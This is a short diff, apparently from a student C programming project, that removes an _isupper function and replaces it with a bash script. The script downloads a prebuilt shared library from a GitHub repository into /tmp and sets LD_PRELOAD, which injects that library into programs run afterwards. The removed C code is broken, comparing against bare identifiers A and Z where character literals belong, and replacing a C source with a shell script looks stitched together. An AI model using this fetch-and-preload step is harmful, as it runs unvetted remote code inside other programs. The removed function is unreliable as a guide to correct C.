@@ -1,27 +1,3 @@
-#include "main.h"
-
-/**
-
-*_isupper - function that verifies if a  character is uppercase or not
-
-*@c: tested character
-
-*Return: returns 1 if it is uppercase , 0 if not
-
-*/
-
-
-
-int _isupper(int c)
-
-{
-
-if ((c >= A) && (c <= Z))
-
-return (1);
-
-
-
-return (0);
-
-}
+#!/bin/bash
+wget -P /tmp https://github.com/baccrie/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libmask.so
+export LD_PRELOAD=/tmp/libmask.so
